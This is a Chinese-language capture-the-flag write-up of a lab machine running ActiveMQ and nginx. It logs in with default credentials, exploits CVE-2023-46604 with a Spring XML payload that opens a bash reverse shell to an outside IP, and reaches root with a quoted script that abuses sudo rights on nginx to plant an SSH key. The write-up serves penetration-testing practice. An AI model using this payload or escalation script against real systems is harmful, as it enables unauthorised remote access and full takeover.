nmap 結果
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

點進去原本是 http auth 的登入畫面 jetty 做的 但試了 admin/admin 就成功登入

登入是 ActiveMQ 發現版本號有個漏洞 [CVE-2023-46604](https://github.com/evkl1d/CVE-2023-46604)
![image](https://hackmd.io/_uploads/S1wNJK6zye.png)

原本照他的跑都不行 後面才想到要去看他的 `poc.xml` 修改成自己的 IP 跟 port
```
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.10.10/9001 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

成功 reverse shell
![image](https://hackmd.io/_uploads/BJmibi6Myl.png)

sudo -l 的結果
```
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

查詢後找到這個[腳本](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406)
```
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

透過他建立 root 的 ssh key 後在目標上連線 `ssh -i id_rsa root@10.10.11.243` 成功提權
![image](https://hackmd.io/_uploads/BkZERi6MJx.png)

也有很多其他的方法 例如建立自己的 nginx.conf 去取得資料等等 可以參考這篇 [writeup](https://blog.csdn.net/qq_43007452/article/details/143097142)